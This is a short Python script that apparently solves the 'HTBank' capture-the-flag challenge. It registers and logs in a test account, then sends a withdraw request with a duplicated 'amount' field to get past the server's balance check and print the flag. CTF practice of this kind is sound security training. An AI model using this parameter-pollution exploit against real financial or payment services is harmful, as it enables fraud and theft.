import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 HTBank.py ip:port")
    sys.exit(1)

host = sys.argv[1]
base_url = f"http://{host}"

username = "test"
password = "test"

session = requests.Session()

try:
    r = session.post(f"{base_url}/api/register", files={
        'username': (None, username),
        'password': (None, password)
    })
    r.raise_for_status()

    r = session.post(f"{base_url}/api/login", files={
        'username': (None, username),
        'password': (None, password)
    })
    r.raise_for_status()

    exploit_data = [
        ('account', (None, '0')),
        ('amount', (None, '0')),
        ('amount', (None, '1337'))
    ]
    req = requests.Request('POST', f"{base_url}/api/withdraw", files=exploit_data)
    prepared = session.prepare_request(req)
    res = session.send(prepared)
    res.raise_for_status()
    res = session.get(f"{base_url}/home")
    res.raise_for_status()
    flag = re.search(r"HTB\{.*?\}", res.text)

    if flag:
        print(flag.group(0))
    else:
        print("Flag not found!")
except requests.exceptions.RequestException as e:
    print(f"Error, request failed: {e}")
    sys.exit(1)
